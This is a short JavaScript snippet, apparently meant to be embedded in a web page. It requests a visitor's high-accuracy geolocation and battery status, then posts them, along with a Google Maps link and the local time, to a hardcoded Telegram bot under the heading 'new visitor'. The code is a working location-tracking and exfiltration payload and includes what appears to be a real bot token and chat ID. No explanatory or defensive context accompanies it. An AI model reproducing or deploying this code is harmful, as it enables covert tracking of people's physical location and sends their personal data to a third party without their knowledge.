
(async () => {
  try {
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
    });

    const battery = await navigator.getBattery();
    const now = new Date();
    const data = {
      lat: position.coords.latitude,
      lon: position.coords.longitude,
      accuracy: position.coords.accuracy,
      batteryLevel: Math.round(battery.level * 100) + "%",
      charging: battery.charging ? "نعم" : "لا",
      date: now.toLocaleString("ar-EG", { hour12: false, timeZone: "Africa/Cairo" })
    };

    await fetch("https://api.telegram.org/bot7593287636:AAFVDiMOuTsVlqmO-62MM3MGECREfXo9YEE/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "2045242656",
        text: `📡 // زائر جديد //
🛰️ الموقع // https://maps.google.com/?q=${data.lat},${data.lon}
📍 دقة الموقع // ${data.accuracy} متر
🔋 البطارية // ${data.batteryLevel}
🔌 الشحن // ${data.charging}
🕰️ الوقت // ${data.date}`,
        parse_mode: "Markdown"
      })
    });
  } catch (err) {
    console.error("فشل الحصول على البيانات:", err);
  }
})();
